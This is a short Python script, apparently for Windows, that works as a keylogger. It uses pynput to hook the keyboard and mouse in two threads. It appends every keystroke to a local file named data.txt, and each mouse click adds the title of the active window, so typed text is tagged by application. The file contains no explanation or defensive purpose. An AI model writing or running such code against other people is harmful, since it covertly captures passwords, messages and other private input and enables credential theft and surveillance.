import threading
from pynput import keyboard
from pynput.mouse import Listener
import win32gui
from pynput.keyboard import Key

def write(txt):
    print(txt)
    file_path = "data.txt"
    with open(file_path, "a") as file:
        # Write content to the file
        file.write(txt)
        file.close()


def on_key_press(key):
    if key == Key.space:
        w = ' '
    elif key == Key.enter:
        w = '\n'
    elif hasattr(key, 'char'):
        w = key.char
    else:
        w = str(key)

    write(w)


def get_active_window_title():
    active_window = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(active_window)
    return window_title

def on_click(x, y, button, pressed):
    if not pressed:
        window_title = get_active_window_title()
        write(f"\n[{window_title}]\n")


def keyboard_listener():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

def mouse_listener():
    with Listener(on_click=on_click) as listener:
        listener.join()

keyboard_thread = threading.Thread(target=keyboard_listener)
mouse_thread = threading.Thread(target=mouse_listener)

keyboard_thread.start()
mouse_thread.start()

keyboard_thread.join()
mouse_thread.join()
